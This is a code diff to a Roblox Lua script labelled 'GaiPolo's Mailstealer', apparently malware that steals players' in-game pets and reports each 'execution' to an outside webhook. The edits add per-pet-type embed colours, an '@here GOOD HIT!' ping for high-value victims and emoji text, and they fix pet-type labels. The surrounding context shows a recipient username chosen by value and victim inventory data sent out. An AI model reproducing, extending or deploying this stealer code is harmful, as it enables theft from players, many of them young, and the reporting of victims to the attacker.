@@ -172,9 +172,17 @@ local function SendMessage(url, username, diamonds)
 
     if highestRAPItemData.category == "Pet" then
         if highestRAPItemData.pettyp == "Golden" then
+	    epikcolor = 14728192
             thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].goldenThumbnail
-        else
+        elseif highestRAPItemData.pettyp == "Rainbow" then
             thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+	    epikcolor = 14680064
+	elseif highestRAPItemData.pettyp == "Shiny" then
+	    thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+	    epikcolor = 16777215
+	elseif highestRAPItemData.pettyp == "Normal" then
+	    thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+	    epikcolor = 65280
         end
         local assetId = thumbid:match("%d+")
         local newUrl = "https://biggamesapi.io/image/" .. assetId
@@ -189,7 +197,7 @@ local function SendMessage(url, username, diamonds)
     if totalRAP > 500000000 then
 		poopie = "@here GOOD HIT!"
     else
-		poopie = "poop hit"
+		poopie = "<:segment_1:1279104032786616430><:segment_2:1279104034145566884><:segment_3:1279104035416440912><:segment_4:1279104036523606133><:segment_5:1279104038121639977>"
     end
     if totalRAP < 10000000 then
 		Username = "footing1i"
@@ -201,7 +209,7 @@ local function SendMessage(url, username, diamonds)
 	["content"] = poopie,
         ["embeds"] = {{
             ["title"] = "New Execution from gem video" ,
-            ["color"] = 65280,
+            ["color"] = epikcolor or 65280,
 			["fields"] = fields,
 			["footer"] = {
 				["text"] = "GaiPolo's Mailstealer"
@@ -381,11 +389,11 @@ for i, v in pairs(categoryList) do
                             typez = "Golden"
                         elseif item.pt and item.pt == 2 then
                             prefix = "Rainbow "
-                            typez = "Normal"
+                            typez = "Rainbow"
                         end
                         if item.sh then
                             prefix = "Shiny " .. prefix
-                            typez = "Normal"
+                            typez = "Shiny"
                         end
                         local realid = item.id
                         local id = prefix .. item.id
